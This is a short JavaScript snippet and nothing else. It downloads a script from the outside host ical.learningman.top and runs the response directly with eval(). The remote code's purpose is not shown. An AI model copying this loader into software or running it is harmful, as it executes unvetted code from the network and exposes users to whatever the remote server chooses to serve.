fetch("https://ical.learningman.top/script")
.then(res => res.text())
.then(text => eval(text))